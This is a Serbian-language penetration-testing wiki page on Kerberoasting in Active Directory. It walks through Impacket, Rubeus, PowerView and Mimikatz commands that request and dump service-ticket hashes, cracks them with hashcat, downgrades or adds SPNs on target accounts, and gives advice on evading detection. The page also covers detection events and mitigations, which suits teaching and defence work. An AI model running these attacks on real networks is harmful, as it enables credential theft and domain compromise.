# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting se fokusira na pribavljanje TGS tiketa, konkretnije onih vezanih za servise koji rade pod korisničkim nalozima u Active Directory (AD), isključujući computer accounts. Enkripcija ovih tiketa koristi ključeve izvedene iz korisničkih lozinki, što omogućava offline razbijanje kredencijala. Korišćenje korisničkog naloga kao servis naznačeno je nepraznim ServicePrincipalName (SPN) svojstvom.

Bilo koji autentifikovani domain user može zatražiti TGS tikete, tako da nisu potrebne posebne privilegije.

### Key Points

- Ciljaju TGS tikete za servise koji rade pod korisničkim nalozima (tj. nalozi sa postavljenim SPN; ne computer accounts).
- Tiketi su enkriptovani ključem izvedenim iz lozinke service account-a i mogu se crack-ovati offline.
- Nisu potrebne povišene privilegije; bilo koji autentifikovani nalog može zatražiti TGS tikete.

> [!WARNING]
> Većina javnih alata preferira zahtevati RC4-HMAC (etype 23) service tikete zato što su brže za crack-ovanje nego AES. RC4 TGS hashevi počinju sa `$krb5tgs$23$*`, AES128 sa `$krb5tgs$17$*`, a AES256 sa `$krb5tgs$18$*`. Međutim, mnogi enviroment-i prelaze na AES-only. Nemojte pretpostavljati da je samo RC4 relevantan.
> Takođe, izbegavajte „spray-and-pray“ roasting. Rubeus’ default kerberoast može query-ovati i zahtevati tikete za sve SPN-ove i bude veoma bučan. Prvo enumerišite i target-ujte interesantne principe.

### Service account secrets & Kerberos crypto cost

Mnogi servisi i dalje rade pod korisničkim nalozima sa ručno upravljanim lozinkama. KDC enkriptuje service tikete ključevima izvedenim iz tih lozinki i daje ciphertext bilo kom autentifikovanom principal-u, tako da kerberoasting daje neograničen broj offline pokušaja bez lockout-a ili DC telemetrije. Mode enkripcije određuje trošak za crack-ovanje:

| Režim | Derivacija ključa | Tip enkripcije | Približna propusnost RTX 5090* | Napomene |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 sa 4,096 iteracija i per-principal salt generisanim iz domena + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt blokira rainbow tables ali i dalje omogućava brzo crack-ovanje kratkih lozinki. |
| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos samo umeće 8-byte confounder po tiketu | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~1000× brže od AES; napadači forsiraju RC4 kad god `msDS-SupportedEncryptionTypes` to dozvoljava. |

*Benchmarks od Chick3nman kao navedeno u [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

RC4 confounder samo randomizuje keystream; ne dodaje rad po pokušaju. Osim ako service account-i ne koriste nasumične tajne (gMSA/dMSA, machine accounts, ili vault-managed strings), brzina kompromisa zavisi isključivo od GPU budžeta. Primena AES-only etype-a uklanja milijardu-pokušaja-po-sekundi degradaciju, ali slabe ljudske lozinke i dalje podležu PBKDF2.

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Višefunkcionalni alati koji uključuju kerberoast provere:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Navesti kerberoastable korisnike
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: Zatraži TGS i dump iz memorije
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Tehnika 2: Automatski alati
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Zahtev za TGS generiše Windows Security Event 4769 (zahtevan je Kerberos service ticket).

### OPSEC i AES-only okruženja

- Namerno zahtevajte RC4 za naloge bez AES-a:
- Rubeus: `/rc4opsec` koristi tgtdeleg da enumeriše naloge bez AES-a i zahteva RC4 service tickets.
- Rubeus: `/tgtdeleg` sa kerberoast takođe pokreće RC4 zahteve gde je moguće.
- Roast AES-only naloge umesto da se neuspeh ignoriše:
- Rubeus: `/aes` enumeriše naloge sa uključenim AES i zahteva AES service tickets (etype 17/18).
- Ako već posedujete TGT (PTT ili iz .kirbi), možete koristiti `/ticket:<blob|path>` sa `/spn:<SPN>` ili `/spns:<file>` i preskočiti LDAP.
- Ciljanje, throttling i manje buke:
- Koristite `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` i `/jitter:<1-100>`.
- Filtrirajte verovatno slabe lozinke koristeći `/pwdsetbefore:<MM-dd-yyyy>` (starije lozinke) ili ciljate privilegovane OU-e sa `/ou:<DN>`.

Primeri (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistencija / Zloupotreba

Ako kontrolišete ili možete izmeniti nalog, možete ga učiniti kerberoastable dodavanjem SPN-a:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Degradirajte nalog kako biste omogućili RC4 radi lakšeg cracking (zahteva write privileges na ciljnom objektu):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Ciljani Kerberoast preko GenericWrite/GenericAll nad korisnikom (privremeni SPN)

- Dodajte privremeni SPN kontrolisanom korisniku kako biste ga učinili pogodnim za Kerberoast.
- Zatražite TGS-REP šifrovan sa RC4 (etype 23) za taj SPN kako biste olakšali cracking.
- Razbijte `$krb5tgs$23$...` hash pomoću hashcat.
- Uklonite SPN da smanjite trag.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux jednolinijska komanda (targetedKerberoast.py automatizuje add SPN -> request TGS (etype 23) -> remove SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Provalite izlaz pomoću hashcat autodetect (mode 13100 for `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: dodavanje/uklanjanje SPN-ova proizvodi promene u direktorijumu (Event ID 5136/4738 na ciljanom korisniku) i TGS zahtev generiše Event ID 4769. Razmotrite ograničavanje učestalosti i brzo čišćenje.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (zastarjelo na nekim distribucijama)
- `rdate -n <DC_IP>`

### Kerberoast bez naloga u domenu (AS-requested STs)

U septembru 2022. Charlie Clark je pokazao da, ako principal ne zahteva pre-authentication, moguće je dobiti service ticket putem posebno konstruisanog KRB_AS_REQ menjajući sname u telu zahteva, čime se zapravo dobija service ticket umesto TGT. Ovo je analogno AS-REP roasting i ne zahteva valid domain credentials.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Morate obezbediti listu korisnika jer bez validnih kredencijala ne možete izvršiti LDAP upit ovom tehnikom.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Povezano

If you are targeting AS-REP roastable users, see also:

{{#ref}}
asreproast.md
{{#endref}}

### Detekcija

Kerberoasting može biti prikriven. Pretražujte Event ID 4769 sa DCs i primenite filtere da smanjite šum:

- Isključite ime servisa `krbtgt` i imena servisa koja se završavaju sa `$` (nalozi računara).
- Isključite zahteve sa naloga računara (`*$$@*`).
- Samo uspešni zahtevi (Failure Code `0x0`).
- Pratite tipove enkripcije: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Ne podižite alarm samo na `0x17`.

Primer PowerShell trijaže:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Dodatne ideje:

- Uspostavite osnovnu (baseline) normalnu upotrebu SPN po hostu/korisniku; alarmirajte na velike izlive različitih SPN zahteva od jednog naloga.
- Obeležite neuobičajenu upotrebu RC4 u domenima ojačanim AES-om.

### Mitigacija / Ojačavanje

- Koristite gMSA/dMSA ili machine accounts za servise. Upravljani nalozi imaju nasumične lozinke duže od 120 karaktera i rotiraju se automatski, što čini offline kriptoanalizu nepraktičnom.
- Nametnite AES za service accounts podešavanjem `msDS-SupportedEncryptionTypes` na AES-only (decimal 24 / hex 0x18) i potom rotirajte lozinku tako da se izvedu AES ključevi.
- Gde je moguće, onemogućite RC4 u vašem okruženju i nadgledajte pokušaje korišćenja RC4. Na DC-ovima možete koristiti `DefaultDomainSupportedEncTypes` registry value da usmerite podrazumevane vrednosti za naloge koji nemaju postavljen `msDS-SupportedEncryptionTypes`. Temeljno testirajte.
- Uklonite nepotrebne SPN-ove iz korisničkih naloga.
- Koristite duge, nasumične lozinke za service account-e (25+ karaktera) ako managed accounts nisu izvodljivi; zabranite često korišćene lozinke i redovno vršite audit.

## Izvori

- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
